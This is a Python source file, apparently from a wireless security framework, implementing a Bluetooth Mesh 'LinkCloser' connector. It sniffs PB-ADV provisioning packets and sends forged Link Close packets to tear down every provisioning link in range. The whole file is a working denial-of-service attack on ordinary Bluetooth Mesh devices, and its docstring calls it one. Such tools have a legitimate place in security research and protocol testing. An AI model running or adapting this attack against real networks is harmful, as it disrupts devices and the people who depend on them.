"""
Bluetooth Mesh LinkCloser connector
====================================

Implements a simple DOS attack aiming at closing every Link open (Generic Provisioning Device) between a provisionee and a provisoner using the PB-ADV bearer.
It sniffs and reacts to any Generic Provisioning packet, retrives the Link Id, and sends a Link Close packet.
The specification says that any device receiving that should close the connexion, hence Dos.
"""

from whad.btmesh.connectors import BTMesh
from whad.scapy.layers.btmesh import (
    BTMesh_Generic_Provisioning_Hdr,
    BTMesh_Generic_Provisioning_Link_Close,
    EIR_PB_ADV_PDU,
    EIR_Hdr,
)

from time import sleep
from random import uniform


class PBAdvLinkCloser(BTMesh):
    def __init__(self, device, connection=None):
        """Create a LinkCloser device"""
        # stack unused
        super().__init__(device)

    def process_rx_packets(self, packet):
        if packet.haslayer(EIR_PB_ADV_PDU):
            pb_adv_packet = packet.getlayer(EIR_PB_ADV_PDU)
            link_id = pb_adv_packet.link_id
            if isinstance(pb_adv_packet[1], BTMesh_Generic_Provisioning_Hdr):
                print(b"DETECTED PROVISIONING PACKET FOR LINK ID " + link_id)
                print("SENDING LINK CLOSE")
                for i in range(0, 5):
                    self.send_raw(
                        EIR_Hdr(type=0x29)
                        / EIR_PB_ADV_PDU(
                            link_id=link_id,
                            transaction_number=0x00,
                            data=BTMesh_Generic_Provisioning_Link_Close(reason=0x02),
                        )
                    )
                    sleep(uniform(0.02, 0.05))
